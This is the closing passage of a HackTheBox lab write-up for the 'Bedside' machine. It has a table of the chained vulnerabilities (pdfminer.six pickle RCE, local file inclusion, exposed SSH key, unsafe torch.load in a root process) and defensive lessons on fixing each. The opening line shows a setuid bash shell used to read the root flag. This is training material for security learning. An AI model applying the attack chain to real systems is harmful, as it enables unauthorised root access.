bash -p → euid=0(root) → root.txt
```

### Vulnerabilities Table

| # | Vulnerability | Impact | Location |
|---|--------------|--------|----------|
| 1 | CVE-2025-64512 — pdfminer.six pickle RCE via CMap path traversal | RCE as datawrangler | Upload portal |
| 2 | Local File Inclusion on internal loopback service | Read arbitrary filesystem files | Internal service |
| 3 | Sensitive file exposure via LFI | SSH private key → shell as developer | developer home directory |
| 4 | `torch.load(weights_only=False)` = unrestricted pickle deserialization | Code execution as root | `/opt/trainer/bedside_trainer.py` |
| 5 | Writable checkpoint directory read by root process | Privilege escalation to root | `/datastore/checkpoints/` |

### Key Lessons

**CVE-2025-64512 — Pickle + user-controlled paths = RCE:** pdfminer.six passed an attacker-controlled value from the PDF directly to `pickle.loads()`. Never deserialize data from a path that originates from untrusted input.

**Internal services are not protected:** A service on loopback is one shell away from being fully exposed. Treat internal services with the same hardening as external ones — they will be reached the moment an attacker lands any foothold.

**`torch.load(weights_only=False)` is a code execution flag:** PyTorch's own documentation warns against this setting. It disables all pickle safety and is equivalent to calling `pickle.load()` on the file. If the load path is writable by anyone below root, it is a privilege escalation.

**Writable directory + root deserializer = guaranteed privesc:** The fatal combination is: low-privilege write access to a directory that a root process reads and deserializes from. Fix either the write access or switch to `weights_only=True`.

**Never expose your stack in HTTP headers:** The single `X-Powered-By: pdfminer.six` header revealed the exact library being used, directly enabling CVE identification and exploitation. Strip all `X-Powered-By` headers before deploying to production.

---

*Writeup by Arax0n | HackTheBox — Bedside (Medium)*
